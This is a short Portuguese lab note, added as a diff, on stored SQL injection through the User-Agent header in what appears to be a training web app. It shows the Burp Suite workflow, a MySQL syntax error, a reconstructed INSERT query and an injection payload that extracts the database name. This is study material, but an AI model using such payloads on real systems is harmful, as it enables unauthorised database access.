@@ -1,0 +1,21 @@
+________________________________
+SQL Injection - Stored (blog)
+--------------------------------
+Sempre que atualizamos a página, é adicionado um registro.
+
+Vendo que o parâmetro é o user-agent, vamos utilizar o bursuite.
+
+O que vamos fazer é modificar nosso user-agent e enviar para  aplicação.
+
+Ex:
+From: User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101
+To: User-Agent: '
+
+ERRO: 
+Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'Firefox/100.0', '127.0.0.1')' at line 1
+
+
+Injeção: teste' (SELECT database()))#
+Query: INSERT INTO blog (data, user_agent, IP) VALUES (new(), '" $user_agent "', ip);
+
+User-Agent: teste', (SELECT database()))#
